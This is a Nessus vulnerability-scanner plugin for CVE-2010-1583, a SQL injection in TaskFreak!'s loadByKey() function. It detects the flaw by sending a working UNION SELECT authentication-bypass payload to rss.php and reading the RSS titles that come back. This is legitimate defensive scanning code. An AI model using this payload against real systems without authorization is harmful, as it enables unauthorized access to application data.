#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46225);
  script_version("$Revision: 1.11 $");
  script_cvs_date("$Date: 2016/11/03 20:40:06 $");

  script_cve_id("CVE-2010-1583");
  script_bugtraq_id(39793);
  script_osvdb_id(64447);

  script_name(english:"TaskFreak! loadByKey() SQL Injection");
  script_summary(english:"Attempts to bypass authentication in rss.php");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP application that is vulnerable to a
SQL injection attacks.");

  script_set_attribute(attribute:"description", value:
"The version of TaskFreak installed on the remote host includes a
version of the Tirzen Framework that fails to sanitize input to the
'loadByKey()' function in the TznDbConnection class before using it in
database queries.

An unauthenticated, remote attacker can leverage this issue to launch a
SQL injection attack against the affected application, leading to
authentication bypass, discovery of sensitive information, attacks
against the underlying database, and the like.

Note that it may also be possible to exploit this via other
parameters, though Nessus has not tested these.");
  script_set_attribute(attribute:"see_also", value:"http://www.madirish.net/?article=456");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2010/Apr/432");
  script_set_attribute(attribute:"see_also", value:"http://www.taskfreak.com/versions.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to TaskFreak 0.6.3 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/04/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/04/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/05/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("taskfreak_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/taskfreak", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'taskfreak', port:port, exit_on_fail:TRUE);

exploit = "' UNION SELECT 1,2,3,'NESSUS',5,'NESSUS',7,8,9,10,11,12,13,14,'NESSUS',16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57+--+'";

url = install['dir']+'/rss.php?'+
      'user=1%00'+urlencode(str:exploit) +
      '&c='+hexstr(MD5('NESSUSNESSUSNESSUS'));

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (
  '<title>TaskFreak! Todo list</title>' >< res[2] &&
  '<rss version="' >< res[2] &&
  (
    '<title><![CDATA[' >< res[2] ||
    '<title>No task for today</title>' >< res[2] ||
    '<title>Pas de t&acirc; pour aujourd&apos;hui</title>' >< res[2] ||
    '<title>Nessun Task per oggi</title>' >< res[2] ||
    ('<title>Keine Aufgaben' >< res[2] && 'heute</title>' >< res[2]) ||
    '<title>Geen taken voor vandaag</title>' >< res[2] ||
    '<title>Ingen opgaver for idag</title>' >< res[2] ||
    ('<title>Brak zada' >< res[2] || 'na dzisiaj</title>' >< res[2])
  )
)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  if (report_verbosity > 0)
  {
    report =
      '\n' +
      'Nessus was able to verify the issue with the following request :\n'+
      '\n' +
      url + '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(0, 'The remote TaskFreak install at '+build_url(qs:install['dir']+'/', port:port) + ' is not affected.');
